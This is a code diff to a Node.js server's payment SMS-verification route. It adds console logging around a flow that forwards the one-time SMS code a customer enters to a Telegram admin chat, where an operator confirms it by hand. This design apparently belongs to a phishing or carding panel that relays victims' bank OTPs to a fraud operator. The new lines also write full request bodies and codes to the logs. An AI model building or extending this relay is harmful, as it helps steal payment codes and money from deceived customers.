@@ -375,6 +375,8 @@ app.post('/api/payment/verify-sms', (req, res) => {
   
   console.log(`🔐 SMS verification request for ${bookingId}, code: ${smsCode}`);
   console.log(`📋 Current sessions:`, Array.from(paymentSessions.keys()));
+  console.log(`📜 Request body:`, JSON.stringify(req.body, null, 2));
+  console.log(`🕰 Request timestamp:`, new Date().toISOString());
   
   const session = paymentSessions.get(bookingId);
   if (!session) {
@@ -409,6 +411,11 @@ app.post('/api/payment/verify-sms', (req, res) => {
   paymentSessions.set(bookingId, session);
   
   // Send confirmation request to Telegram admin
+  console.log(`📤 Preparing to send code confirmation request to admin`);
+  console.log(`📱 SMS Code: ${smsCode}`);
+  console.log(`🆔 Booking ID: ${bookingId}`);
+  console.log(`💬 Admin Chat ID: ${TELEGRAM_CONFIG.ADMIN_CHAT_ID}`);
+  
   const inlineKeyboard = {
     inline_keyboard: [[
       { text: '✅ Подтвердить код', callback_data: `confirm_code:${bookingId}` },
@@ -416,12 +423,18 @@ app.post('/api/payment/verify-sms', (req, res) => {
     ]]
   };
   
+  console.log(`🎮 Inline keyboard:`, JSON.stringify(inlineKeyboard, null, 2));
+  
   sendTelegramMessage(
     TELEGRAM_CONFIG.ADMIN_CHAT_ID,
     `🔐 Клиент ввел SMS код: <code>${smsCode}</code>\n\n🆔 ID заказа: <code>${bookingId}</code>\n\n❓ Подтвердить код?`,
     'HTML',
     inlineKeyboard
-  );
+  ).then(result => {
+    console.log(`📨 Telegram message sent, result:`, result);
+  }).catch(error => {
+    console.error(`❌ Error sending Telegram message:`, error);
+  });
   
   // Notify client to wait for confirmation
   notifyClient(bookingId, {
